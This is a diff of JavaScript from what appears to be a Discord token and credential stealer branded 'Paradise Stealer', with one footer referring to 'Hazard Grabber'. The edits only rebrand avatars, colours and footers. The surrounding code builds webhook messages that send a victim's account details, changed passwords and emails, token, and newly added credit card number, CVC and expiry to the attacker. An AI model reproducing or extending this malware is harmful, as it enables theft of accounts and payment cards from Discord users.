@@ -140,12 +140,12 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Paradise Stealer",
+            username: "ParadiseStealer",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/906888341285396520/942417490867286046/p_1.png",
+            avatar_url: "https://media.discordapp.net/attachments/906888341285396520/942416773385433118/p.png?width=300&height=300",
             embeds: [
                 {
-                    "color": 3447704,
+                    "color": 16507654,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Paradise Stealer "
+                        "text": "Paradise Stealer"
                     }
                 }
             ]
@@ -184,10 +184,10 @@ function ChangePassword(oldpassword, newpassword, token) {
         var params = {
             username: "Paradise Stealer",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/906888341285396520/942417490867286046/p_1.png",
+            avatar_url: "https://media.discordapp.net/attachments/906888341285396520/942416773385433118/p.png?width=300&height=300",
             embeds: [
                 {
-                    "color": 3447704,
+                    "color": 16507654,
                     "fields": [
                         {
                             "name": "**Password Changed**",
@@ -210,7 +210,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Paradise Stealer"
+                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }                 
                 }
             ]
@@ -231,10 +231,10 @@ function ChangeEmail(newemail, password, token) {
         var params = {
             username: "Paradise Stealer",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/906888341285396520/942417490867286046/p_1.png",
+            avatar_url: "https://media.discordapp.net/attachments/906888341285396520/942416773385433118/p.png?width=300&height=300",
             embeds: [
                 {
-                    "color": 3447704,
+                    "color": 16507654,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Paradise Stealer"
+                        "text": "ParadiseStealer"
                     }                
                 }
             ]
@@ -278,10 +278,10 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         var params = {
             username: "Paradise Stealer",
             content: "@everyone",
-            avatar_url: "https://cdn.discordapp.com/attachments/906888341285396520/942417490867286046/p_1.png",
+            avatar_url: "https://media.discordapp.net/attachments/906888341285396520/942416773385433118/p.png?width=300&height=300",
             embeds: [
                 {
-                    "color": 3447704,
+                    "color": 16507654,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Paradise Stealer"
+                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
                     }
                 }
             ]
